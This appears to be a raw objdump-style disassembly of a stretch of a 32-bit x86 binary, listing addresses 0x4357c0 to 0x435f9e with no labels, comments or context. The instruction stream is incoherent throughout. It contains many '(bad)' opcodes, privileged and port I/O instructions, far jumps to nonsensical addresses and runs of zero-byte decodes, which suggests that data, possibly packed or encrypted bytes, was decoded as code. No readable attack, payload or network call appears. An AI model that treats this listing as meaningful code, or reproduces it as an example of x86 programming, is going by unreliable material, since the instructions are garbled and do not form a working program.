  4357c0:	add    BYTE PTR [ebp-0x2db5549],ch
  4357c6:	scas   al,BYTE PTR es:[edi]
  4357c7:	push   cs
  4357c8:	add    BYTE PTR [ecx-0x1d],cl
  4357cb:	cmp    eax,0x32730457
  4357d0:	xor    BYTE PTR [esi-0x27],ah
  4357d3:	xchg   edx,eax
  4357d4:	and    al,0xcd
  4357d6:	scas   al,BYTE PTR es:[edi]
  4357d7:	push   cs
  4357d8:	add    BYTE PTR [ecx],cl
  4357da:	jecxz  0x43581c
  4357dc:	(bad)  
  4357dd:	lods   eax,DWORD PTR ds:[esi]
  4357de:	rol    BYTE PTR [edx+0x44],cl
  4357e1:	imul   esi,DWORD PTR [esi+0x7f90890e],0x1f475c2e
  4357eb:	inc    edi
  4357ec:	adc    al,dl
  4357ee:	or     ebp,DWORD PTR [eax+eax*8-0x44]
  4357f2:	add    esi,eax
  4357f4:	je     0x43586a
  4357f6:	call   FWORD PTR [ecx+0x4efdb033]
  4357fc:	add    BYTE PTR [edi],bl
  4357fe:	pop    edx
  4357ff:	(bad)  
  435800:	je     0x43586e
  435802:	mov    bl,0xc5
  435804:	rcr    BYTE PTR [ebx],cl
  435806:	shr    BYTE PTR [esi],0x20
  435809:	adc    ebp,DWORD PTR [eax+0x1790142e]
  43580f:	or     eax,0xfaef7cf9
  435814:	clc    
  435815:	add    BYTE PTR [eax],al
  435817:	add    BYTE PTR [eax],al
  435819:	add    ch,al
  43581b:	mov    esp,0xfe2413c5
  435820:	dec    esi
  435821:	add    BYTE PTR [esi],bh
  435823:	out    dx,al
  435824:	cdq    
  435825:	shl    DWORD PTR [edi],0xf4
  435828:	xchg   ecx,eax
  435829:	les    ebp,FWORD PTR [ebp+ecx*8-0x5]
  43582d:	call   FWORD PTR [ebp-0x6c]
  435830:	sar    BYTE PTR [ebp+0x3e],0x7
  435834:	pcmpeqb mm1,QWORD PTR [ecx-0x50fbc228]
  43583b:	imul   BYTE PTR [esi+0xe]
  43583e:	push   eax
  43583f:	or     edx,DWORD PTR [edx+0x1737903a]
  435845:	stc    
  435846:	pop    esi
  435847:	mov    eax,0x4ba25ffc
  43584c:	pcmpgtd mm4,QWORD PTR [eax+0x7f520f35]
  435853:	imul   BYTE PTR [esi+0x12]
  435856:	ror    BYTE PTR [ebx],1
  435858:	xchg   edx,eax
  435859:	les    ebx,FWORD PTR [ecx+eax*2+0x171b53d2]
  435860:	sbb    eax,0xf1b2d58b
  435865:	xor    al,0xee
  435867:	mov    dl,0xcc
  435869:	push   ecx
  43586a:	cwde   
  43586b:	test   BYTE PTR [esi],ah
  43586d:	push   0xffffff90
  43586f:	sbb    edx,esp
  435871:	repz mov ?,WORD PTR [edx-0xb]
  435875:	adc    BYTE PTR [eax-0x62],0xf9
  435879:	xor    ebp,DWORD PTR [ecx]
  43587b:	mov    edi,0xf255
  435880:	add    BYTE PTR [eax],al
  435882:	add    BYTE PTR [edi-0x4e],ah
  435885:	jo     0x4358c8
  435887:	sbb    al,0xd
  435889:	not    DWORD PTR [edx]
  43588b:	push   eax
  43588c:	jmp    0x435844
  43588e:	add    BYTE PTR [eax-0x78178f81],dl
  435894:	push   es
  435895:	add    eax,0x62b29003
  43589a:	xor    esp,0x40d76c17
  4358a0:	and    DWORD PTR [ecx+esi*8+0x3b],0xffffffbe
  4358a5:	xor    eax,0x712f0b04
  4358aa:	(bad)  
  4358ab:	fstp   DWORD PTR [eax]
  4358ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4358ae:	xor    edi,DWORD PTR [eax]
  4358b0:	mov    ds:0x2790449a,al
  4358b5:	jb     0x43592b
  4358b7:	mov    esp,0x246c5418
  4358bc:	mov    ah,0xf5
  4358be:	add    eax,DWORD PTR [eax+0xa]
  4358c1:	js     0x435932
  4358c3:	stos   DWORD PTR es:[edi],eax
  4358c4:	sbb    BYTE PTR [eax-0x40],bh
  4358c7:	test   BYTE PTR [edi],ch
  4358c9:	xor    eax,0x7a278556
  4358ce:	je     0x43585c
  4358d0:	sbb    BYTE PTR [esp+ebp*8],al
  4358d3:	xchg   esp,eax
  4358d4:	mov    dl,0xf5
  4358d6:	add    edx,DWORD PTR [ebx+esi*8]
  4358d9:	push   0x1eb227ff
  4358de:	ret    
  4358df:	mov    esi,0x53200df2
  4358e4:	test   BYTE PTR [edi+0xfd],dl
  4358ea:	add    BYTE PTR [eax],al
  4358ec:	adc    al,0x7
  4358ee:	pop    esi
  4358ef:	in     al,dx
  4358f0:	xchg   ebx,eax
  4358f1:	mov    dl,0x99
  4358f3:	and    ebx,DWORD PTR fs:[ebx+ebp*8]
  4358f7:	(bad)  
  4358f8:	jne    0x43587c
  4358fa:	test   al,0x75
  4358fc:	lock jb 0x43590d
  4358ff:	jb     0x43595d
  435901:	or     ebp,DWORD PTR [esi-0x6de5b78d]
  435907:	test   eax,0xe9f72e8e
  43590c:	xchg   ebx,eax
  43590d:	mov    dl,0x99
  43590f:	ins    BYTE PTR es:[edi],dx
  435910:	out    dx,eax
  435911:	push   ss
  435912:	jmp    0x4358b2
  435914:	ret    
  435915:	sub    edx,DWORD PTR [ecx-0x14e617a7]
  43591b:	cmp    edi,esp
  43591d:	ret    
  43591e:	mov    edx,0x99b253dd
  435923:	fs aaa 
  435925:	pop    ss
  435926:	jmp    0x43599e
  435928:	mov    ds:0xb8249984,eax
  43592d:	mov    cl,BYTE PTR [edx+0x3eb2538c]
  435933:	push   ecx
  435934:	mov    ebx,0x1256e941
  435939:	out    dx,eax
  43593a:	std    
  43593b:	imul   ebx,ebx,0xe96d1b19
  435941:	mov    dl,0xe
  435943:	jmp    0x9b2ddd62
  435948:	arpl   WORD PTR [ebx],bp
  43594a:	cdq    
  43594b:	jns    0x435905
  43594d:	sbb    ebx,ebp
  43594f:	adc    DWORD PTR [eax],eax
  435951:	add    BYTE PTR [eax],al
  435953:	add    BYTE PTR [eax],al
  435955:	jb     0x435986
  435957:	jmp    0xeaae737a
  43595c:	arpl   WORD PTR [ebx+0xa],cx
  43595f:	mov    ds:0x92196681,al
  435964:	add    BYTE PTR [edx-0x97bea24],dh
  43596a:	mov    bl,0xe
  43596c:	add    ah,ch
  43596e:	xor    bl,BYTE PTR [esi+0x3dfd6efd]
  435974:	push   0x4e372d
  435979:	mov    esp,0x5efa7e97
  43597e:	std    
  43597f:	jne    0x43598f
  435981:	sub    BYTE PTR [ebx-0x7e9eaff2],dh
  435987:	cmp    ch,0xee
  43598a:	xor    dl,dl
  43598c:	adc    BYTE PTR [edx-0x34811b0a],bh
  435992:	xchg   BYTE PTR [edx],dl
  435994:	add    DWORD PTR [ecx],ebp
  435996:	mov    bl,0x97
  435998:	test   DWORD PTR [ecx-0x1],ebp
  43599b:	in     al,0xff
  43599d:	leave  
  43599e:	xchg   dl,bl
  4359a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4359a1:	test   eax,0x1115e5ae
  4359a6:	and    ebp,DWORD PTR [ebx]
  4359a8:	add    BYTE PTR [ecx-0x6ff1341],ah
  4359ae:	mov    dl,0x5d
  4359b0:	inc    ebx
  4359b1:	xchg   ebx,eax
  4359b2:	jb     0x4359fc
  4359b4:	push   esi
  4359b5:	pop    esp
  4359b6:	xlat   BYTE PTR ds:[ebx]
  4359b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4359b8:	push   0x0
  4359ba:	add    BYTE PTR [eax],al
  4359bc:	add    BYTE PTR [eax],al
  4359be:	mov    ecx,0xd915e5e2
  4359c3:	add    al,0x2b
  4359c5:	add    BYTE PTR [edx],ch
  4359c7:	repnz sbb DWORD PTR [ebx],esi
  4359ca:	imul   ebx,esi,0xaf48970
  4359d0:	xchg   edi,eax
  4359d1:	inc    ebp
  4359d2:	and    esi,ebx
  4359d4:	je     0x4359d6
  4359d6:	cmp    al,0x87
  4359d8:	jle    0x4359d4
  4359da:	outs   dx,BYTE PTR ds:[esi]
  4359db:	std    
  4359dc:	xchg   esi,eax
  4359dd:	(bad)  
  4359de:	jmp    0x91433ee0
  4359e3:	xchg   edx,eax
  4359e4:	pop    ebx
  4359e5:	mov    eax,0xffcb4f57
  4359ea:	ja     0x4359f8
  4359ec:	psubsb mm5,QWORD PTR [eax+0x18]
  4359f0:	ret    0x5ff9
  4359f3:	(bad)  
  4359f4:	in     eax,0xbf
  4359f6:	addr16 (bad) 
  4359f8:	cmc    
  4359f9:	or     eax,DWORD PTR ds:0x4ffb7f9f
  4359ff:	cmc    
  435a00:	test   BYTE PTR [ecx+esi*1+0x502ec1fd],0xc6
  435a08:	xlat   BYTE PTR ds:[ebx]
  435a09:	mov    ebp,0x7ff3a0dd
  435a0e:	cmp    al,0xc
  435a10:	or     eax,0xd999000
  435a15:	dec    ebp
  435a16:	(bad)  
  435a17:	nop
  435a18:	rcl    BYTE PTR [ecx-0x27],0x3b
  435a1c:	mov    cl,0x8d
  435a1e:	pop    ss
  435a1f:	inc    esp
  435a20:	stos   BYTE PTR es:[edi],al
  435a21:	mov    esi,0x0
  435a26:	add    BYTE PTR [edi],al
  435a28:	cmp    eax,0x8e884298
  435a2d:	iret   
  435a2e:	jae    0x4359bf
  435a30:	pop    ecx
  435a31:	iret   
  435a32:	out    0x22,eax
  435a34:	or     al,0xf
  435a36:	add    BYTE PTR ds:0xdffa0f8f,dl
  435a3c:	test   bh,dh
  435a3e:	aam    0xd7
  435a40:	(bad)  
  435a41:	ret    0x5585
  435a44:	lds    ecx,FWORD PTR [esi+0x147cc44b]
  435a4a:	add    BYTE PTR [eax-0x7caff075],dl
  435a50:	retf   
  435a51:	pop    es
  435a52:	inc    ebx
  435a53:	cwde   
  435a54:	xchg   BYTE PTR [esp+edi*8-0x69],dl
  435a58:	jbe    0x435a29
  435a5a:	sub    eax,0xc08e48bb
  435a5f:	xchg   ebx,eax
  435a60:	mov    dl,0xa5
  435a62:	xor    al,bh
  435a64:	mov    dl,0xf5
  435a66:	add    edx,DWORD PTR [eax+0x27]
  435a69:	mov    ebx,0xc80acff3
  435a6e:	mov    dh,0x79
  435a70:	adc    eax,0x7de4c379
  435a75:	jp     0x435ab5
  435a77:	pusha  
  435a78:	xor    BYTE PTR [edx+0x46],0x5c
  435a7c:	or     dh,BYTE PTR [edx-0x4a]
  435a7f:	pop    ecx
  435a80:	adc    eax,0x6dc4c479
  435a85:	pusha  
  435a86:	push   ecx
  435a87:	inc    esp
  435a88:	loope  0x435a3f
  435a8a:	or     eax,0x0
  435a8f:	add    bl,dl
  435a91:	push   ds
  435a92:	inc    esp
  435a93:	std    
  435a94:	mov    dh,0x97
  435a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435a97:	add    al,0x90
  435a99:	mov    dl,0x35
  435a9b:	push   esi
  435a9c:	jle    0x435a20
  435a9e:	add    eax,0xb9670b34
  435aa3:	fmul   QWORD PTR [edi+esi*8-0x4d]
  435aa7:	rcl    DWORD PTR [edx+esi*8],cl
  435aaa:	add    BYTE PTR [ecx],ch
  435aac:	popa   
  435aad:	adc    eax,0x728fbbea
  435ab2:	cmc    
  435ab3:	mov    al,dl
  435ab5:	popf   
  435ab6:	out    dx,eax
  435ab7:	jle    0x435afc
  435ab9:	or     BYTE PTR [eax+0x41],bh
  435abc:	in     al,0x14
  435abe:	jo     0x435a83
  435ac0:	call   0xda167732
  435ac5:	cs xor eax,0x60827b59
  435acb:	ret    0xc7b8
  435ace:	cmc    
  435acf:	add    edx,DWORD PTR [eax+0x4b8120e0]
  435ad5:	push   ss
  435ad6:	cmp    eax,0x2c14cc8f
  435adb:	mov    ?,WORD PTR [edx-0x6c16f14e]
  435ae1:	sub    DWORD PTR [ecx-0x14e53e17],ebx
  435ae7:	das    
  435ae8:	xchg   ebp,eax
  435ae9:	mov    dl,0x4d
  435aeb:	mov    bl,0xe8
  435aed:	sbb    ebx,DWORD PTR [eax+0x4778c32a]
  435af3:	and    BYTE PTR [eax],al
  435af5:	add    BYTE PTR [eax],al
  435af7:	add    BYTE PTR [eax],al
  435af9:	dec    esi
  435afa:	scas   eax,DWORD PTR es:[edi]
  435afb:	push   cs
  435afc:	jo     0x435ad8
  435afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435aff:	mul    DWORD PTR [ecx]
  435b01:	test   eax,0x7068fa2d
  435b06:	pop    ds
  435b07:	or     eax,0x446593e9
  435b0c:	jb     0x435b72
  435b0e:	xchg   esi,eax
  435b0f:	ins    BYTE PTR es:[edi],dx
  435b10:	in     eax,dx
  435b11:	xchg   ebx,eax
  435b12:	sahf   
  435b13:	dec    edx
  435b14:	arpl   WORD PTR [eax-0x274d6d56],ax
  435b1a:	ficomp DWORD PTR [ecx-0x14e5dc8c]
  435b20:	mov    esi,0xb7ec174b
  435b25:	inc    edx
  435b26:	xchg   esi,eax
  435b27:	imul   edx,DWORD PTR [ebx+0x6a14a193],0x170e0060
  435b31:	xchg   ebx,eax
  435b32:	sub    eax,0x7010e55c
  435b37:	les    edi,FWORD PTR [ecx]
  435b39:	mov    esp,0x5913e82
  435b3e:	cli    
  435b3f:	jmp    0x93e9:0xd09147e
  435b46:	daa    
  435b47:	xchg   ecx,eax
  435b48:	fld    st(1)
  435b4a:	sbb    ebx,ebp
  435b4c:	das    
  435b4d:	xchg   ebx,eax
  435b4e:	mov    dl,0x4e
  435b50:	mov    al,0x68
  435b52:	sbb    edx,DWORD PTR [edi-0x2acf4059]
  435b58:	aad    0x89
  435b5a:	arpl   si,si
  435b5c:	add    BYTE PTR [eax],al
  435b5e:	add    BYTE PTR [eax],al
  435b60:	add    BYTE PTR [eax],al
  435b62:	aas    
  435b63:	loope  0x435b4a
  435b65:	(bad)  
  435b66:	cmp    cl,BYTE PTR [ecx+0x442d001a]
  435b6c:	bound  ecx,QWORD PTR [eax]
  435b6e:	xor    al,0x71
  435b70:	(bad)  
  435b71:	out    0x6b,eax
  435b73:	pmulhw mm7,mm7
  435b76:	add    dh,BYTE PTR [edx+0x16]
  435b79:	test   DWORD PTR [eax+0x28e8137b],esi
  435b7f:	and    al,0xe5
  435b81:	(bad)  
  435b82:	cli    
  435b83:	mov    DWORD PTR [esi],edx
  435b85:	add    BYTE PTR [edi],al
  435b87:	(bad)  
  435b88:	rol    edx,cl
  435b8a:	ins    DWORD PTR es:[edi],dx
  435b8b:	scas   eax,DWORD PTR es:[edi]
  435b8c:	aas    
  435b8d:	mov    edx,DWORD PTR [ebp+0x2f]
  435b90:	cli    
  435b91:	sbb    al,0x3b
  435b93:	scas   eax,DWORD PTR es:[edi]
  435b94:	push   cs
  435b95:	xor    edi,ecx
  435b97:	fadd   QWORD PTR [eax+0x57]
  435b9a:	mov    dl,0xe7
  435b9c:	xchg   esi,eax
  435b9d:	lea    edx,[ebx-0x1d]
  435ba0:	in     al,0xff
  435ba2:	mov    al,ds:0x6e891669
  435ba7:	mov    dl,0x97
  435ba9:	ja     0x435be4
  435bab:	mul    DWORD PTR [ebp-0x2]
  435bae:	out    0x0,eax
  435bb0:	xchg   edi,eax
  435bb1:	cwde   
  435bb2:	imul   ebp,DWORD PTR [edi+0x5582000e],0xfffffff6
  435bb9:	fs std 
  435bbb:	scas   al,BYTE PTR es:[edi]
  435bbc:	push   cs
  435bbd:	test   DWORD PTR [ecx],ebp
  435bbf:	push   dx
  435bc1:	push   0xffffffcd
  435bc3:	xchg   ebx,eax
  435bc4:	push   edi
  435bc5:	fadd   DWORD PTR [eax]
  435bc7:	add    BYTE PTR [eax],al
  435bc9:	add    BYTE PTR [eax],al
  435bcb:	mov    dh,bl
  435bcd:	pop    ecx
  435bce:	xor    eax,DWORD PTR [edx]
  435bd0:	fstp   QWORD PTR [ecx-0x1]
  435bd3:	mov    esp,0xb9401be6
  435bd8:	sub    ecx,esi
  435bda:	jle    0x435b85
  435bdc:	mov    BYTE PTR [ebx],ah
  435bde:	pop    esp
  435bdf:	nop
  435be0:	inc    esi
  435be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435be2:	je     0x435b68
  435be4:	mov    dl,bl
  435be6:	adc    al,0x2d
  435be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435be9:	add    edi,eax
  435beb:	mov    cs:0x8db8434e,al
  435bf1:	push   ebx
  435bf2:	fadd   DWORD PTR [eax-0x61]
  435bf5:	xchg   BYTE PTR [edx-0x2c],ch
  435bf8:	sbb    ebp,DWORD PTR [edx-0x36]
  435bfb:	js     0x435bf4
  435bfd:	loop   0x435bf8
  435bff:	jg     0x435ba0
  435c01:	ror    BYTE PTR [ecx],cl
  435c03:	sbb    eax,0xe5c096dc
  435c08:	add    cl,dl
  435c0a:	(bad)  
  435c0b:	mov    ds:0xf6c001d4,al
  435c10:	xchg   edx,eax
  435c11:	sbb    BYTE PTR [edi+0xf1b66],dh
  435c17:	sbb    eax,0x47fbc99f
  435c1c:	icebp  
  435c1d:	data16 sbb al,dl
  435c20:	rol    BYTE PTR [ebx-0xa],cl
  435c23:	or     ebx,DWORD PTR [ecx+0x1e]
  435c26:	pop    edx
  435c27:	retf   
  435c28:	inc    edx
  435c29:	rcl    BYTE PTR [ebx+0x1b],cl
  435c2c:	add    BYTE PTR [edx+0xe4],dl
  435c32:	add    BYTE PTR [eax],al
  435c34:	sbb    BYTE PTR [ebx+0x1b91fccb],bl
  435c3a:	cmovge ebx,DWORD PTR [ebx]
  435c3d:	ja     0x435c29
  435c3f:	push   ecx
  435c40:	ret    
  435c41:	sub    DWORD PTR [esi],esp
  435c43:	test   ecx,edi
  435c45:	xchg   edx,eax
  435c46:	inc    ebx
  435c47:	and    al,0x84
  435c49:	xchg   esi,eax
  435c4a:	mov    edx,0x1fa9274
  435c4f:	xchg   ax,ax
  435c51:	and    esp,DWORD PTR [ebp-0x6c772005]
  435c57:	rol    BYTE PTR [edi-0x6fffa269],0xb2
  435c5e:	cmc    
  435c5f:	jle    0x435cb5
  435c61:	(bad)  
  435c62:	or     eax,0xe5d654ca
  435c67:	add    ebp,DWORD PTR [eax-0x562ea607]
  435c6d:	cmp    eax,0xeaafffa4
  435c72:	mov    dl,al
  435c74:	cdq    
  435c75:	ss xor eax,0x8c3d2c57
  435c7b:	call   FWORD PTR [edx]
  435c7d:	fstp   DWORD PTR ss:[ebx+0x33f5b290]
  435c84:	or     esi,DWORD PTR [esi-0x27]
  435c87:	repz (bad) 
  435c89:	sbb    dh,BYTE PTR [eax+0x60116930]
  435c8f:	push   edi
  435c90:	lods   al,BYTE PTR ds:[esi]
  435c91:	mov    esi,0x79e4c371
  435c96:	jb     0x435cd7
  435c98:	add    BYTE PTR [eax],al
  435c9a:	add    BYTE PTR [eax],al
  435c9c:	add    BYTE PTR [esi+eiz*4-0x598ba892],ch
  435ca3:	mov    ebp,0xcc102738
  435ca8:	mov    BYTE PTR [eax-0x79],dl
  435cab:	fisttp WORD PTR [eax+0x7acb8642]
  435cb1:	call   0x6011:0x2969641a
  435cb8:	mov    esi,0xcf5a3a28
  435cbd:	sbb    ebp,eax
  435cbf:	mov    ds:0xe1d6847d,eax
  435cc4:	fisub  DWORD PTR [edi-0x77a72fc9]
  435cca:	cmp    eax,0x720d003c
  435ccf:	int    0x7c
  435cd1:	in     eax,dx
  435cd2:	cmp    esp,DWORD PTR [eax+eax*1]
  435cd5:	or     eax,0x917cdd73
  435cda:	cmp    eax,0x3990280e
  435cdf:	push   ebx
  435ce0:	in     eax,0xea
  435ce2:	mov    ah,0xd4
  435ce4:	lods   eax,DWORD PTR ds:[esi]
  435ce5:	outs   dx,DWORD PTR ds:[esi]
  435ce6:	mov    ds:0xd6585e0d,al
  435ceb:	(bad)  
  435cec:	popa   
  435ced:	neg    DWORD PTR [ecx]
  435cef:	xor    al,0x4f
  435cf1:	fisttp WORD PTR [edx]
  435cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435cf4:	push   edi
  435cf5:	lea    esi,[edx-0x29b793f2]
  435cfb:	push   es
  435cfc:	das    
  435cfd:	mov    WORD PTR [edx+0xa04e],?
  435d03:	add    BYTE PTR [eax],al
  435d05:	add    al,ch
  435d07:	pop    es
  435d08:	dec    ebx
  435d09:	jb     0x435d59
  435d0b:	ins    DWORD PTR es:[edi],dx
  435d0c:	inc    edi
  435d0d:	jb     0x435d78
  435d0f:	ins    BYTE PTR es:[edi],dx
  435d10:	shr    ch,1
  435d12:	xchg   ebx,eax
  435d13:	arpl   WORD PTR [edi-0x19e8ed03],dx
  435d19:	push   0x70
  435d1b:	iret   
  435d1c:	aas    
  435d1d:	xchg   edi,eax
  435d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435d1f:	cmp    ch,ah
  435d21:	add    ebp,ecx
  435d23:	fsubr  st,st(3)
  435d25:	out    dx,al
  435d26:	retf   0xf5fa
  435d29:	pop    esp
  435d2a:	sbb    eax,0x6372eb0a
  435d2f:	xor    al,0xe4
  435d31:	out    0xf,al
  435d33:	scas   al,BYTE PTR es:[edi]
  435d34:	or     eax,0x5a3b93e9
  435d39:	or     eax,0x562391c
  435d3e:	and    al,0x18
  435d40:	lods   al,BYTE PTR ds:[esi]
  435d41:	mov    DWORD PTR [ebp+0xa],eax
  435d44:	xchg   edx,eax
  435d45:	test   eax,0xe9ea340e
  435d4a:	xchg   ebx,eax
  435d4b:	mov    dl,0x99
  435d4d:	sub    eax,0x50f6d6a8
  435d52:	sub    al,0xd
  435d54:	jmp    0x435db2
  435d56:	push   edi
  435d57:	(bad)  
  435d58:	xor    al,BYTE PTR [eax]
  435d5a:	adc    ebp,0x3e
  435d5d:	push   ecx
  435d5e:	sub    DWORD PTR [esi-0x6f],0xffffffce
  435d62:	adc    DWORD PTR [esi-0x49],esi
  435d65:	(bad)  
  435d66:	ds aaa 
  435d68:	into   
  435d69:	sldt   WORD PTR [eax]
  435d6c:	add    BYTE PTR [eax],al
  435d6e:	add    BYTE PTR ds:0xa9000e59,dh
  435d74:	xor    bl,BYTE PTR [edx+0x24]
  435d77:	mov    ecx,0x5fa0feeb
  435d7c:	add    BYTE PTR [edx-0x2cc86140],dl
  435d82:	add    BYTE PTR [ecx-0x7ab3684d],ch
  435d88:	or     dh,bl
  435d8a:	xor    BYTE PTR ds:0x358de4fd,dl
  435d90:	xlat   BYTE PTR ds:[ebx]
  435d91:	add    ch,BYTE PTR [edx+0x6c]
  435d94:	ret    
  435d95:	pop    ebx
  435d96:	push   0xc
  435d98:	mov    eax,ds
  435d9a:	call   0x28b009
  435d9f:	cmc    
  435da0:	repz adc al,0x84
  435da3:	(bad)  
  435da4:	mov    bl,0xe
  435da6:	add    ah,ch
  435da8:	iret   
  435da9:	xor    dl,BYTE PTR [eax]
  435dab:	xchg   ecx,eax
  435dac:	in     eax,0xaf
  435dae:	(bad)  
  435daf:	cs mov esi,esp
  435db2:	test   DWORD PTR [esi+0x6a],ebx
  435db5:	or     bh,bh
  435db7:	aad    0xda
  435db9:	(bad)  
  435dba:	push   esi
  435dbb:	push   0xdf8b756c
  435dc0:	in     eax,dx
  435dc1:	imul   BYTE PTR [esi+ebx*8-0x4c306f04]
  435dc8:	pop    esi
  435dc9:	test   BYTE PTR [ebp+edx*2-0x2d7b1b03],0x69
  435dd1:	push   0xffffff84
  435dd3:	add    BYTE PTR [eax],al
  435dd5:	add    BYTE PTR [eax],al
  435dd7:	add    BYTE PTR [esi],bl
  435dd9:	or     eax,0x1990848f
  435dde:	ltr    WORD PTR ds:0xf81036ad
  435de5:	xchg   BYTE PTR [esi-0x257c2006],dh
  435deb:	adc    edi,0xc
  435dee:	sti    
  435def:	clc    
  435df0:	inc    esp
  435df1:	cmc    
  435df2:	ficom  WORD PTR [eax+0x61]
  435df5:	jecxz  0x435e3f
  435df7:	test   esi,ecx
  435df9:	pusha  
  435dfa:	cwde   
  435dfb:	lods   al,BYTE PTR ds:[esi]
  435dfc:	mov    bh,0x67
  435dfe:	gs leave 
  435e00:	sbb    al,cl
  435e02:	retf   0x2c4f
  435e05:	js     0x435de0
  435e07:	test   BYTE PTR [ebx+0x448b2844],bh
  435e0d:	mov    ebp,0x3486e7e6
  435e12:	fdiv   st(1),st
  435e14:	adc    eax,0xea143360
  435e19:	or     ebx,DWORD PTR [edi]
  435e1b:	dec    edi
  435e1c:	jmp    0xae89:0x78ca662b
  435e23:	stc    
  435e24:	addr16 mov al,ds:0x74d2
  435e28:	stos   DWORD PTR es:[edi],eax
  435e29:	sahf   
  435e2a:	dec    esi
  435e2b:	and    al,0x80
  435e2d:	mov    bl,0x88
  435e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435e30:	dec    esi
  435e31:	sbb    eax,0x150df866
  435e36:	inc    ebx
  435e37:	sub    al,0x3f
  435e39:	push   0x1036
  435e3e:	add    BYTE PTR [eax],al
  435e40:	add    bh,bl
  435e42:	retf   0x6f48
  435e45:	sbb    ebp,DWORD PTR [esi]
  435e47:	(bad)  
  435e48:	outs   dx,DWORD PTR ds:[esi]
  435e49:	hlt    
  435e4a:	hlt    
  435e4b:	fld    DWORD PTR [ebp-0x17487db1]
  435e51:	mov    BYTE PTR [edi-0x27],bh
  435e54:	stc    
  435e55:	adc    al,0x21
  435e57:	inc    esp
  435e58:	adc    BYTE PTR [ebx],bl
  435e5a:	mov    bl,0xe3
  435e5c:	(bad)  
  435e5e:	xchg   ecx,eax
  435e5f:	mov    esp,cs
  435e61:	or     eax,0x4dd58cfd
  435e66:	or     eax,0x39e2109c
  435e6b:	mov    ebx,0x60693a2c
  435e70:	out    0x3b,al
  435e72:	icebp  
  435e73:	or     DWORD PTR [ecx-0x44],edi
  435e76:	xor    DWORD PTR [ecx+0x51e47cb],edx
  435e7c:	or     BYTE PTR [eax-0x5fb1894e],dl
  435e82:	mov    dl,0xf5
  435e84:	mov    ds:0xa9706190,eax
  435e89:	inc    edx
  435e8a:	cmp    esi,DWORD PTR [ecx-0x46c473d9]
  435e90:	daa    
  435e91:	cmp    BYTE PTR [ebp+0xd8f4878],0xf5
  435e98:	(bad)  [edx+ebx*8+0x34]
  435e9c:	int3   
  435e9d:	adc    eax,0x27f2fcfa
  435ea2:	or     eax,0x7804
  435ea7:	add    BYTE PTR [eax],al
  435ea9:	add    BYTE PTR [eax+0x37],ah
  435eac:	add    edi,esp
  435eae:	adc    edx,DWORD PTR [edi+0x3f9003f6]
  435eb4:	mov    ecx,0x693b7827
  435eb9:	daa    
  435eba:	test   al,0x1a
  435ebc:	sbb    BYTE PTR [edx+ecx*2+0xd],ch
  435ec0:	jns    0x435e86
  435ec2:	mov    DWORD PTR [esi],esi
  435ec4:	aaa    
  435ec5:	add    eax,0x3872b290
  435eca:	je     0x435e72
  435ecc:	int    0x27
  435ece:	pop    es
  435ecf:	or     al,0xd4
  435ed1:	jge    0x435ea7
  435ed3:	(bad)  
  435ed4:	leave  
  435ed5:	adc    BYTE PTR [eax-0x7a],0xe
  435ed9:	pand   mm0,QWORD PTR [ebp+0x7dc3d532]
  435ee0:	js     0x435ef7
  435ee2:	jg     0x435edc
  435ee4:	cmc    
  435ee5:	ret    0xb17
  435ee8:	jmp    0x435f4c
  435eea:	test   al,0xd6
  435eec:	or     ah,BYTE PTR [ebx+0x34]
  435eef:	sbb    bl,BYTE PTR [esi+0xa]
  435ef2:	retf   
  435ef3:	or     dl,BYTE PTR [edx+0x1b30dba2]
  435ef9:	call   0xddb1191
  435efe:	jo     0x435ebe
  435f00:	cdq    
  435f01:	mov    ch,0x9f
  435f03:	shl    dh,cl
  435f05:	es out dx,al
  435f07:	pop    es
  435f08:	jmp    0x435f6e
  435f0a:	push   eax
  435f0b:	(bad)  
  435f0c:	cs ret 
  435f0e:	add    BYTE PTR [eax],al
  435f10:	add    BYTE PTR [eax],al
  435f12:	add    BYTE PTR [eax+0x38d33d7c],ch
  435f18:	aaa    
  435f19:	fcom   QWORD PTR [ecx-0xa]
  435f1c:	push   esi
  435f1d:	jmp    0x435f55
  435f1f:	adc    bl,dh
  435f21:	sbb    ah,BYTE PTR [ebp+0x65]
  435f24:	mov    bl,0xe
  435f26:	jmp    0x39ba1608
  435f2b:	div    DWORD PTR [edx+0xe]
  435f2e:	mov    eax,0x1f977fcd
  435f33:	inc    esp
  435f34:	cmp    al,0xb7
  435f36:	push   es
  435f37:	dec    ebx
  435f38:	aaa    
  435f39:	into   
  435f3a:	out    dx,al
  435f3b:	xlat   BYTE PTR ds:[ebx]
  435f3c:	loop   0x435f4b
  435f3e:	jmp    0x5c55f3d6
  435f43:	rcl    dh,1
  435f45:	add    bh,BYTE PTR [ecx]
  435f47:	test   DWORD PTR [esp+eiz*2+0x661af972],edx
  435f4e:	sbb    BYTE PTR [edx+0xa],0x92
  435f52:	test   eax,0xa3302a
  435f57:	sub    DWORD PTR [eax+0x654830e],esi
  435f5d:	jmp    0x435fd4
  435f5f:	loope  0x435f59
  435f61:	pop    esi
  435f62:	adc    BYTE PTR [esi],dh
  435f64:	arpl   WORD PTR [edx],bx
  435f66:	push   ecx
  435f67:	mov    ds:0x21ce915f,eax
  435f6c:	fidiv  WORD PTR [ecx-0x3173f901]
  435f72:	(bad)  
  435f74:	sahf   
  435f75:	push   cs
  435f76:	add    BYTE PTR [eax],al
  435f78:	add    BYTE PTR [eax],al
  435f7a:	add    BYTE PTR [eax],al
  435f7c:	jmp    0xbab820b3
  435f81:	les    ebx,FWORD PTR [ebx+0x6a]
  435f84:	nop
  435f85:	mov    ebx,eax
  435f87:	call   0x288c01
  435f8c:	sub    eax,0x2b8414ef
  435f91:	scas   eax,DWORD PTR es:[edi]
  435f92:	push   cs
  435f93:	add    BYTE PTR [edx],bh
  435f95:	jp     0x435fad
  435f97:	add    BYTE PTR [ebp-0x5e8a19fa],bh
  435f9d:	(bad)  
  435f9e:	je     0x43600a
